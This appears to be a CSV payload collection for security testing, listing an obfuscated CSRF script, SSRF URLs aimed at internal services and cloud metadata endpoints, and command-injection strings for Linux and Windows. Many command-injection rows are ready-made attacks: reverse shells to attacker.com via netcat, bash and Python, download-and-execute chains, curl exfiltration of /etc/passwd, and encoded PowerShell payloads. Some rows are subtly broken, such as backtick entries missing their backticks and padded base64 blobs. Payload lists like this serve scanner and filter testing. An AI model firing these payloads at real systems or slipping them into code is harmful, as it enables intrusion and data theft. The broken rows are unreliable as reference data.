id,attack_class,payload,type,severity,context,description,example
csrf-100,csrf,"<script>var s=['ht','tp','s:','//','target','.com','/api','/evil'].join('');var f=document.createElement('form');f.action=s;f.method='POST';var i=document.createElement('input');i.name='cmd';i.value='run';f.appendChild(i);document.body.appendChild(f);f.submit();</script>",CSRF,high,Array join obfuscation,CSRF with obfuscated script using array join,
ssrf-001,ssrf,http://127.0.0.1/,SSRF,high,Access internal localhost service,Basic SSRF to internal IP,
ssrf-002,ssrf,http://192.168.1.1/,SSRF,high,Access internal network device,SSRF to internal private IP range,
ssrf-003,ssrf,http://169.254.169.254/latest/meta-data/,SSRF,critical,AWS EC2 instance metadata,SSRF to metadata service on AWS,
ssrf-004,ssrf,http://metadata.google.internal/computeMetadata/v1/,SSRF,critical,Google Cloud metadata,SSRF to GCP metadata service,
ssrf-005,ssrf,http://169.254.169.254/metadata/instance?api-version=2021-02-01,SSRF,critical,Azure VM metadata,SSRF to Azure instance metadata,
ssrf-006,ssrf,redis://127.0.0.1:6379,SSRF,high,Access internal Redis,SSRF to internal Redis service,
ssrf-007,ssrf,memcached://127.0.0.1:11211,SSRF,high,Access internal Memcached,SSRF to internal Memcached service,
ssrf-008,ssrf,ftp://127.0.0.1/,SSRF,medium,Access internal FTP,SSRF to internal FTP server,
ssrf-009,ssrf,smb://192.168.1.100/share,SSRF,high,Access internal SMB share,SSRF to internal SMB share,
ssrf-010,ssrf,http://127.0.0.1:2375/containers/json,SSRF,critical,Access Docker API,SSRF to internal Docker API,
ssrf-011,ssrf,https://kubernetes.default.svc/api,SSRF,critical,Access Kubernetes API,SSRF to internal Kubernetes API,
ssrf-012,ssrf,http://127.0.0.1:8080/api/json,SSRF,high,Access Jenkins API,SSRF to internal Jenkins API,
ssrf-013,ssrf,http://127.0.0.1:9200/_cat/indices?v,SSRF,high,Access Elasticsearch,SSRF to internal Elasticsearch cluster,
ssrf-014,ssrf,http://127.0.0.1:15672/api/overview,SSRF,high,Access RabbitMQ API,SSRF to internal RabbitMQ management API,
ssrf-015,ssrf,mysql://127.0.0.1:3306,SSRF,high,Access MySQL service,SSRF to internal MySQL service,
ssrf-016,ssrf,postgresql://127.0.0.1:5432,SSRF,high,Access PostgreSQL service,SSRF to internal PostgreSQL service,
ssrf-017,ssrf,smtp://127.0.0.1:25,SSRF,medium,Access SMTP server,SSRF to internal SMTP server,
ssrf-018,ssrf,snmp://127.0.0.1,SSRF,medium,Access SNMP service,SSRF to internal SNMP service,
ssrf-019,ssrf,ldap://127.0.0.1:389,SSRF,high,Access LDAP service,SSRF to internal LDAP service,
ssrf-020,ssrf,http://127.0.0.1/../../../../etc/passwd,SSRF,critical,Attempt path traversal via SSRF,SSRF to internal HTTP service with path traversal,
ssrf-021,ssrf,http://%31%39%32.%31%36%38.%31.%31/,SSRF,high,URL encoded internal IP,SSRF with URL encoded internal IP,
ssrf-022,ssrf,http://0300.0250.0001.0001/,SSRF,high,Octal encoded IP address,SSRF with octal encoded IP,
ssrf-023,ssrf,http://3232235777/,SSRF,high,Decimal encoded IP address,SSRF with decimal encoded IP,
ssrf-024,ssrf,http://[::1]/,SSRF,high,IPv6 localhost,SSRF with IPv6 loopback,
ssrf-025,ssrf,file:///etc/passwd,SSRF,critical,Local file read attempt,SSRF with file protocol to read local file,
ssrf-026,ssrf,gopher://127.0.0.1:6379/_SET%20key%201%0D%0A,SSRF,critical,Gopher protocol to Redis,SSRF with gopher protocol to send raw TCP,
ssrf-027,ssrf,"data:text/html;base64,PHNjcmlwdD5hbGVydCgnU1NSRiBFeHBlcmltZW50Jyk8L3NjcmlwdD4=",SSRF,medium,Data URI with embedded script,SSRF with data URI scheme,
ssrf-028,ssrf,javascript:alert('SSRF'),SSRF,low,JavaScript URI scheme,SSRF with javascript URI scheme,
ssrf-029,ssrf,file:///proc/self/environ,SSRF,critical,Access process environment,SSRF with file descriptor access,
ssrf-030,ssrf,http://%31%32%37.%30.%30.%31%2F%2E%2E%2F%2E%2E%2Fetc/passwd,SSRF,critical,Nested URL encoded path traversal,SSRF with nested URL encoding,
ssrf-031,ssrf,ftp://127.0.0.1/../../../../etc/passwd,SSRF,critical,FTP directory traversal,SSRF with FTP protocol and directory traversal,
ssrf-032,ssrf,smb://127.0.0.1/../../../../Windows/System32/drivers/etc/hosts,SSRF,critical,SMB UNC path traversal,SSRF with SMB protocol and UNC path,
ssrf-033,ssrf,http://127.0.0.1:80/%0d%0aGET%20/%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0a%0d%0a,SSRF,critical,HTTP request smuggling,SSRF with HTTP request smuggling attempt,
ssrf-034,ssrf,"http://127.0.0.1:80/
X-Injected-Header: evil",SSRF,critical,HTTP header injection,SSRF with HTTP header injection,
ssrf-035,ssrf,http://admin:password@127.0.0.1/admin,SSRF,high,Basic auth credentials,SSRF with HTTP basic auth to internal service,
ssrf-036,ssrf,http://external.com/redirect?url=http://127.0.0.1/,SSRF,high,Redirect to internal IP,SSRF with HTTP redirect to internal IP,
ssrf-037,ssrf,http://evil.com/,SSRF,critical,DNS rebinding to internal IP,SSRF with DNS rebinding attack,
ssrf-038,ssrf,http://[::ffff:127.0.0.1]/,SSRF,high,IPv4 mapped IPv6,SSRF with IPv4 mapped IPv6 address,
ssrf-039,ssrf,http://127.0.0.1/%0a%0d,SSRF,medium,Encoded newline injection,SSRF with encoded newline characters,
ssrf-040,ssrf,http://127.0.0.1/?_method=POST,SSRF,medium,Method override parameter,SSRF with HTTP POST method override,
ssrf-041,ssrf,http://127.0.0.1/chunked,SSRF,medium,Chunked transfer encoding test,SSRF with HTTP chunked transfer encoding,
ssrf-042,ssrf,http://127.0.0.1/trace,SSRF,medium,HTTP TRACE method test,SSRF with HTTP TRACE method,
ssrf-043,ssrf,http://127.0.0.1/options,SSRF,medium,HTTP OPTIONS method test,SSRF with HTTP OPTIONS method,
ssrf-044,ssrf,http://127.0.0.1/connect,SSRF,medium,HTTP CONNECT method test,SSRF with HTTP CONNECT method,
ssrf-045,ssrf,http://127.0.0.1/patch,SSRF,medium,HTTP PATCH method test,SSRF with HTTP PATCH method,
ssrf-046,ssrf,http://127.0.0.1/delete,SSRF,medium,HTTP DELETE method test,SSRF with HTTP DELETE method,
ssrf-047,ssrf,http://127.0.0.1/put,SSRF,medium,HTTP PUT method test,SSRF with HTTP PUT method,
ssrf-049,ssrf,"http://127.0.0.1/
X-Forwarded-For: 127.0.0.1",SSRF,high,Inject X-Forwarded-For header,SSRF with HTTP header injection via URL,
ssrf-050,ssrf,http://127.0.0.1@evil.com/,SSRF,high,Userinfo section in URL,SSRF with HTTP userinfo section to bypass filters,
ssrf-051,ssrf,dict://127.0.0.1/,SSRF,medium,Access internal dictionary service,SSRF with dict protocol to query dictionary service,
ssrf-052,ssrf,telnet://127.0.0.1:23,SSRF,medium,Access internal telnet service,SSRF with telnet protocol,
ssrf-053,ssrf,"ldap://127.0.0.1:389/ou=users,dc=example,dc=com?uid",SSRF,high,LDAP query,SSRF with ldap protocol to query LDAP server,
ssrf-054,ssrf,rdp://127.0.0.1:3389,SSRF,medium,Access internal RDP service,SSRF with rdp protocol,
ssrf-055,ssrf,smb://127.0.0.1/share,SSRF,high,Access SMB share,SSRF with smb protocol to access Windows share,
ssrf-056,ssrf,nfs://127.0.0.1/export,SSRF,medium,Access NFS export,SSRF with nfs protocol,
ssrf-057,ssrf,imap://127.0.0.1:143,SSRF,medium,Access IMAP mail server,SSRF with imap protocol,
ssrf-058,ssrf,pop3://127.0.0.1:110,SSRF,medium,Access POP3 mail server,SSRF with pop3 protocol,
ssrf-059,ssrf,mqtt://127.0.0.1:1883,SSRF,medium,Access MQTT broker,SSRF with mqtt protocol,
ssrf-060,ssrf,ws://127.0.0.1:8080/,SSRF,medium,Access WebSocket service,SSRF with ws protocol (WebSocket),
ssrf-061,ssrf,wss://127.0.0.1:8443/,SSRF,medium,Access secure WebSocket service,SSRF with wss protocol (Secure WebSocket),
ssrf-062,ssrf,bitcoin://127.0.0.1/,SSRF,low,Bitcoin protocol scheme,SSRF with bitcoin protocol,
ssrf-063,ssrf,magnet:?xt=urn:btih:abcdef1234567890,SSRF,low,Magnet link protocol,SSRF with magnet protocol,
ssrf-064,ssrf,ssh://127.0.0.1:22,SSRF,medium,Access SSH service,SSRF with ssh protocol,
ssrf-065,ssrf,tel:+1234567890,SSRF,low,Telephone protocol,SSRF with tel protocol,
ssrf-066,ssrf,sms:+1234567890,SSRF,low,SMS protocol,SSRF with sms protocol,
ssrf-067,ssrf,"geo:37.786971,-122.399677",SSRF,low,Geolocation protocol,SSRF with geo protocol,
ssrf-068,ssrf,svn://127.0.0.1/repo,SSRF,medium,Subversion protocol,SSRF with svn protocol,
ssrf-069,ssrf,git://127.0.0.1/repo.git,SSRF,medium,Git protocol,SSRF with git protocol,
ssrf-070,ssrf,sftp://127.0.0.1/home/user/,SSRF,medium,Secure FTP protocol,SSRF with sftp protocol,
ssrf-071,ssrf,http://%2531%25327%2532%253E%253E%253E/,SSRF,high,Double URL encoded IP,SSRF with double URL encoding,
ssrf-072,ssrf,HtTp://127.0.0.1/,SSRF,medium,Mixed case HTTP scheme,SSRF with mixed case scheme to bypass filters,
ssrf-073,ssrf,http://127.0.0.1%00.example.com/,SSRF,high,Null byte injection,SSRF with embedded null byte to bypass filters,
ssrf-074,ssrf,"http://127.0.0.1/
Set-Cookie:evil=1",SSRF,critical,CRLF injection,SSRF with CRLF injection in URL,
ssrf-076,ssrf,http://[::ffff:192.168.1.1]:8080/,SSRF,high,IPv6 embedded IPv4 with port,SSRF with IPv6 embedded IPv4 and port,
ssrf-078,ssrf,http://127.0.0.1/%0d%0aX-Injected-Header:evil,SSRF,critical,HTTP header injection,SSRF with HTTP header injection via URL encoding,
ssrf-080,ssrf,file:///etc/passwd%00,SSRF,critical,File read with null byte,SSRF with file protocol and directory traversal,
ssrf-081,ssrf,http://admin%3Apassword@127.0.0.1/,SSRF,high,Basic auth with encoding,SSRF with HTTP basic auth and URL encoding,
ssrf-091,ssrf,http://0x7f.0x0.0x0.0x1/,SSRF,high,Hexadecimal IPv4 address,SSRF with IPv4 in hexadecimal,
ssrf-092,ssrf,http://127.1/,SSRF,high,Shortened IPv4 address,SSRF with IPv4 in mixed notation,
ssrf-093,ssrf,http://2130706433/,SSRF,high,Integer IPv4 address,SSRF with IPv4 in integer format,
ssrf-095,ssrf,http://127.0.0.1/#fragment,SSRF,low,URL fragment,SSRF with HTTP URL fragment,
ssrf-096,ssrf,http://127.0.0.1/?param=value,SSRF,low,Query parameter,SSRF with HTTP URL query parameter injection,
ssrf-098,ssrf,http://127.0.0.1/%2e%2e/%2e%2e%2e/%2e%2e/%2e%2e/etc/passwd,SSRF,critical,URL encoded path traversal,SSRF with HTTP URL encoded path traversal,
ssrf-099,ssrf,http://127.0.0.1/%2f%2f/etc/passwd,SSRF,critical,Encoded double slash,SSRF with HTTP URL encoded double slash,
ssrf-100,ssrf,http://%31%32%37.%30.%30.%31/%2E%2E/%2e%2e/%2E%2e/etc/passwd,SSRF,critical,Mixed encoding and case path traversal,SSRF with HTTP URL with mixed encoding and case,
cmdinj-001,cmdi,; ls -la,Command Injection,high,Inject list directory command,Basic command injection with semicolon,
cmdinj-002,cmdi,&& cat /etc/passwd,Command Injection,critical,Inject read passwd file,Command injection with && operator,
cmdinj-003,cmdi,| whoami,Command Injection,high,Inject whoami command,Command injection with pipe operator,
cmdinj-004,cmdi,id,Command Injection,high,Inject id command using backticks,Command injection with backticks,
cmdinj-005,cmdi,$(uname -a),Command Injection,high,Inject uname command,Command injection with $() syntax,
cmdinj-006,cmdi,$(echo $(whoami)),Command Injection,high,Nested command substitution,Command injection with nested $(),
cmdinj-007,cmdi,& sleep 10,Command Injection,medium,Inject sleep command for timing attack,Command injection with ampersand and sleep,
cmdinj-008,cmdi,"&& echo 'injected'
",Command Injection,high,Inject command with newline,Command injection with newline character,
cmdinj-009,cmdi,; curl http://attacker.com,Command Injection,critical,Exfiltrate data via curl,Command injection with semicolon and curl,
cmdinj-010,cmdi,; wget http://attacker.com/malware.sh -O /tmp/m.sh; sh /tmp/m.sh,Command Injection,critical,Download and execute malware,Command injection with semicolon and wget,
cmdinj-011,cmdi,| nc attacker.com 4444 -e /bin/sh,Command Injection,critical,Reverse shell via netcat,Command injection with pipe and netcat reverse shell,
cmdinj-012,cmdi,whoami,Command Injection,high,Execute whoami command,Command injection with backticks and whoami,
cmdinj-013,cmdi,$(id),Command Injection,high,Execute id command,Command injection with $() and id,
cmdinj-014,cmdi,; echo injected,Command Injection,medium,Simple echo injection,Command injection with semicolon and echo,
cmdinj-015,cmdi,&& cat /etc/shadow,Command Injection,critical,Read shadow file,Command injection with && and cat /etc/shadow,
cmdinj-016,cmdi,; id,Command Injection,high,Execute id command,Command injection with semicolon and id,
cmdinj-017,cmdi,| env,Command Injection,medium,Print environment variables,Command injection with pipe and env,
cmdinj-018,cmdi,ls /,Command Injection,high,List root directory,Command injection with backticks and ls,
cmdinj-019,cmdi,$(ps aux),Command Injection,medium,List running processes,Command injection with $() and ps,
cmdinj-020,cmdi,; whoami,Command Injection,high,Execute whoami command,Command injection with semicolon and whoami,
cmdinj-021,cmdi,%3B%20id,Command Injection,high,URL encoded semicolon and id command,Command injection with URL encoding,
cmdinj-022,cmdi,`echo \whoami\`,Command Injection,high,Nested backticks execution,Command injection with nested backticks,
cmdinj-023,cmdi,; echo $USER,Command Injection,medium,Print current user environment variable,Command injection with environment variable,
cmdinj-024,cmdi,; echo\x20injected,Command Injection,medium,Hex encoded space character,Command injection with hex encoded characters,
cmdinj-025,cmdi,; echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNjY2Ng== | base64 -d | bash,Command Injection,critical,Base64 encoded reverse shell,Command injection with base64 encoded command,
cmdinj-026,cmdi,$(sleep 10),Command Injection,medium,Timing attack with sleep,Command injection with command substitution and sleep,
cmdinj-027,cmdi,; echo $(whoami),Command Injection,high,Nested command substitution,Command injection with semicolon and nested $(),
cmdinj-028,cmdi,; echo injected\; ls,Command Injection,medium,Escape semicolon,Command injection with backslash escaping,
cmdinj-029,cmdi,; ls -la && whoami || echo failed,Command Injection,high,Multiple command chaining,Command injection with multiple command separators,
cmdinj-030,cmdi,; (id; uname -a),Command Injection,high,Grouped commands,Command injection with command grouping,
cmdinj-031,cmdi,; (sleep 5),Command Injection,medium,Subshell with sleep,Command injection with subshell,
cmdinj-032,cmdi,; ls -la #,Command Injection,medium,Command injection with comment,Command injection with command chaining and comments,
cmdinj-033,cmdi,echo $(whoami),Command Injection,high,Nested command execution,Command injection with backticks and nested $(),
cmdinj-034,cmdi,; echo $PATH,Command Injection,medium,Print PATH environment variable,Command injection with semicolon and environment variable expansion,
cmdinj-035,cmdi,$(echo injected),Command Injection,medium,Echo injected string,Command injection with command substitution and echo,
cmdinj-036,cmdi,; (echo injected; whoami),Command Injection,high,Multiple commands in subshell,Command injection with semicolon and nested subshell,
cmdinj-037,cmdi,; sleep 15,Command Injection,medium,Timing attack,Command injection with semicolon and sleep for timing,
cmdinj-040,cmdi,; curl http://attacker.com/malware.sh -o /tmp/m.sh; sh /tmp/m.sh,Command Injection,critical,Download and execute script,Command injection with semicolon and curl download,
cmdinj-042,cmdi,; export MALICIOUS=1,Command Injection,medium,Set environment variable,Command injection with semicolon and environment variable manipulation,
cmdinj-043,cmdi,; echo 'malicious' > /tmp/malicious.txt,Command Injection,medium,Write to file,Command injection with semicolon and echo to file,
cmdinj-044,cmdi,; chmod +x /tmp/m.sh,Command Injection,medium,Change file permissions,Command injection with semicolon and chmod,
cmdinj-045,cmdi,; cat /etc/shadow,Command Injection,critical,Read shadow file,Command injection with semicolon and cat /etc/shadow,
cmdinj-046,cmdi,; echo 'injected; ls -la',Command Injection,medium,Echo with special characters,Command injection with semicolon and echo with special characters,
cmdinj-047,cmdi,"; echo ""$(whoami)""",Command Injection,high,Nested command with quotes,Command injection with semicolon and nested command with quotes,
cmdinj-048,cmdi,"; awk 'BEGIN {system(""id"")}'",Command Injection,high,Execute command via awk,Command injection with semicolon and awk command,
cmdinj-049,cmdi,; perl -e 'print id',Command Injection,high,Execute command via perl,Command injection with semicolon and perl command,
cmdinj-050,cmdi,"; python -c 'import os; os.system(""id"")'",Command Injection,high,Execute command via python,Command injection with semicolon and python command,
cmdinj-051,cmdi,& whoami,Command Injection,high,Execute whoami command,Windows cmd injection with & separator,
cmdinj-052,cmdi,| dir,Command Injection,high,List directory contents,Windows cmd injection with | separator,
cmdinj-053,cmdi,&& ipconfig,Command Injection,high,Display network config,Windows cmd injection with && separator,
cmdinj-054,cmdi,|| net user,Command Injection,high,List users,Windows cmd injection with || separator,
cmdinj-055,cmdi,; Get-Process,Command Injection,high,List running processes,Windows PowerShell injection with semicolon,
cmdinj-057,cmdi,$(Get-ChildItem),Command Injection,high,List directory contents,Windows PowerShell injection with $(),
cmdinj-058,cmdi,; Start-Process notepad.exe,Command Injection,medium,Launch notepad,Windows PowerShell injection with Start-Process,
cmdinj-059,cmdi,& echo injected > C:\Windows\Temp\injected.txt,Command Injection,medium,Write to file,Windows cmd injection with echo to file,
cmdinj-060,cmdi,& nc attacker.com 4444 -e cmd.exe,Command Injection,critical,Reverse shell,Windows cmd injection with netcat reverse shell,
cmdinj-062,cmdi,| id,Command Injection,high,Execute id,macOS/Linux injection with pipe and id,
cmdinj-063,cmdi,&& uname -a,Command Injection,high,System info,macOS/Linux injection with && and uname,
cmdinj-069,cmdi,; powershell -EncodedCommand SQBFAFgAUABMAGEAYwBlAC4AZQB4AGU=,Command Injection,high,Encoded PowerShell command,Windows PowerShell injection with encoded command,
cmdinj-070,cmdi,"& for /L %i in (1,1,5) do @echo %i",Command Injection,medium,Loop command,Windows cmd injection with for loop,
cmdinj-071,cmdi,; Invoke-Expression 'whoami',Command Injection,high,Execute command,Windows PowerShell injection with Invoke-Expression,
cmdinj-072,cmdi,; env,Command Injection,medium,Print environment variables,macOS/Linux injection with semicolon and env,
cmdinj-073,cmdi,; cat /etc/passwd,Command Injection,critical,Read passwd file,macOS/Linux injection with semicolon and cat /etc/passwd,
cmdinj-074,cmdi,& reg query HKLM\Software,Command Injection,medium,Query registry,Windows cmd injection with reg query,
cmdinj-075,cmdi,; Get-Content C:\Windows\System32\drivers\etc\hosts,Command Injection,high,Read hosts file,Windows PowerShell injection with Get-Content,
cmdinj-076,cmdi,; dmesg,Command Injection,medium,Kernel messages,macOS/Linux injection with semicolon and dmesg,
cmdinj-077,cmdi,; netstat -an,Command Injection,medium,Network connections,macOS/Linux injection with semicolon and netstat,
cmdinj-078,cmdi,& tasklist,Command Injection,medium,List running tasks,Windows cmd injection with tasklist,
cmdinj-079,cmdi,; Get-Service,Command Injection,medium,List services,Windows PowerShell injection with Get-Service,
cmdinj-080,cmdi,; ps aux,Command Injection,medium,List processes,macOS/Linux injection with semicolon and ps aux,
cmdinj-081,cmdi,& echo injected | findstr injected,Command Injection,medium,Echo and filter output,Windows cmd injection with echo and pipe,
cmdinj-082,cmdi,; Start-Process notepad.exe -WindowStyle Hidden,Command Injection,medium,Launch process hidden,Windows PowerShell injection with Start-Process and hidden window,
cmdinj-083,cmdi,; curl http://attacker.com/?data=$(cat /etc/passwd),Command Injection,critical,Exfiltrate data via curl,macOS/Linux injection with semicolon and curl to exfiltrate data,
cmdinj-084,cmdi,& powershell -EncodedCommand JABXAGUAYgA9ACJIZWxsbyBXb3JsZCIiOwAkAFcAZQBiAC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAiADsA,Command Injection,high,Encoded PowerShell payload,Windows cmd injection with powershell encoded command,
cmdinj-085,cmdi,; nc attacker.com 4444 -e /bin/bash,Command Injection,critical,Reverse shell via netcat,macOS/Linux injection with semicolon and nc reverse shell,
cmdinj-086,cmdi,& certutil -urlcache -split -f http://attacker.com/malware.exe malware.exe & malware.exe,Command Injection,critical,Download and execute file,Windows cmd injection with certutil download,
cmdinj-087,cmdi,; bash -i >& /dev/tcp/attacker.com/4444 0>&1,Command Injection,critical,Reverse shell via bash,macOS/Linux injection with semicolon and bash reverse shell,
cmdinj-088,cmdi,; Invoke-WebRequest -Uri http://attacker.com/malware.ps1 -OutFile C:\Windows\Temp\m.ps1; powershell -ExecutionPolicy Bypass -File C:\Windows\Temp\m.ps1,Command Injection,critical,Download and execute PowerShell script,Windows PowerShell injection with Invoke-WebRequest,
cmdinj-089,cmdi,"; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""attacker.com"",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""])'",Command Injection,critical,Reverse shell via python,macOS/Linux injection with semicolon and python reverse shell,
cmdinj-090,cmdi,& powershell -EncodedCommand SQBFAFgAUABMAGUAYQBjAGgAIABbAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQAgAC0AVwAgAC0AVwBpAG4AZABvAHcAXQ==,Command Injection,critical,Encoded PowerShell reverse shell,Windows cmd injection with powershell encoded reverse shell,
cmdinj-091,cmdi,; e${IFS}cho injected,Command Injection,high,Bypass simple filters using ${IFS} (space) variable,Obfuscated command injection using environment variable concatenation,
cmdinj-093,cmdi,%253B%2520id,Command Injection,high,Double URL encoded semicolon and id,Command injection with double URL encoding,
cmdinj-094,cmdi,; VAR=whoami; $VAR,Command Injection,high,Use variable to execute command,Command injection using variable substitution and command chaining,
cmdinj-095,cmdi,; echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash,Command Injection,critical,Decode and execute base64 payload,Command injection using nested base64 decoding and execution,
cmdinj-096,cmdi,"&& echo injected
id",Command Injection,high,Use newline as command separator,Command injection using less common command separator (newline),
cmdinj-097,cmdi,; powershell -EncodedCommand JABXAGUAYgA9ACJXaG8gSSBhbSIiOwAkAFcAZQBiAC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAuAFcAaQBuAGQAbwB3AC4AVwBhAHIAcgBhAG4AdAAiADsA,Command Injection,critical,Obfuscated PowerShell encoded command,Command injection using PowerShell encoded command with obfuscation,
cmdinj-098,cmdi,"; echo $(echo ""$(whoami)"")",Command Injection,high,Nested command substitution with quotes,Command injection using command substitution with nested quotes,
cmdinj-099,cmdi,; export CMD=whoami; ${CMD},Command Injection,high,Indirect command execution via env var,Command injection using environment variable and indirect expansion,
